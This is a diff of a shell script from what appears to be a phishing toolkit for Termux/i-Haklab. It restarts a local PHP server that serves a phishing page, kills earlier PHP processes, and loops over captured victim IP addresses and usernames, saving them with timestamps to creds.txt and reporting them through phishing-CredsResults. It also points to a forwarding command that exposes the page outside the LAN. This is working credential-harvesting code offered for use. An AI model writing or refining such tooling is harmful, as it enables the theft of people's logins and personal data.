@@ -74,13 +74,13 @@ Doredirect() {
 }
 
 Server() {
-#	checkphp=$(ps aux | grep -o "php" | head -n1)
-	checkphp=$(ps aux | grep "127.0.0.1:4546" | head -n1 | awk '{print $2}')
-#	if [ $checkphp == *'php'* ]; then
-	if [ ! -z $checkphp ]; then
-		kill -TERM $checkphp
-#		pkill -f -2 php > /dev/null 2>&1
-#		killall -2 php > /dev/null 2>&1
+	checkphp=$(ps aux | grep -o "php" | head -n1)
+#	checkphp=$(ps aux | grep "127.0.0.1:4546" | head -n1 | awk '{print $2}')
+	if [ $checkphp == *'php'* ]; then
+#	if [ ! -z $checkphp ]; then
+#		kill -TERM $checkphp > /dev/null 2>&1
+		pkill -f -2 php > /dev/null 2>&1
+		killall -2 php > /dev/null 2>&1
         fi
         ########## RUNNING SERVER #################
         exec serverphp $TMP_PATH > /dev/null 2>&1 &
@@ -180,24 +180,19 @@ if [ ! -e $TMP_PATH/creds.txt ]; then
         touch $TMP_PATH/creds.txt
 fi
 
-printf "$G\n[+]->$W Credentials will be save in \$PREFIX/var/service/php/$SITE/creds.txt$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$B\n[-]->$W Waiting for information . . .\n"
+date >> $TMP_PATH/creds.txt
+printf "$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W To lunch it out of lan run :$G i-Haklab forwarding$Y\n[!]-> Credentials will be save in /$PREFIX/var/service/php/$SITE/creds.txt$B\n[-]->$W Waiting for information (ctrl_c to cancel). . .\n"
 while [ true ]; do
-
-
-until [ -e $TMP_PATH/ip.txt ]; do
 	sleep 10
-done
-exec date >> $TMP_PATH/creds.txt
-exec cat $TMP_PATH/ip.txt >> $TMP_PATH/creds.txt
-phishing-IPresults
+        
+	while [ -e $TMP_PATH/ip.txt ]; do
+		phishing-IPresults
+		rm $TMP_PATH/ip.txt
+        done
 
-until [ -e $TMP_PATH/usernames.txt ]; do
-	sleep 10
-done
-exec date >> $TMP_PATH/creds.txt
-exec cat $TMP_PATH/usernames.txt >> $TMP_PATH/creds.txt
-phishing-CredsResults
-
-
+	while [ -e $TMP_PATH/usernames.txt ]; do
+		phishing-CredsResults
+		rm $TMP_PATH/usernames.txt
+	done
 done
 #		@IVAM3
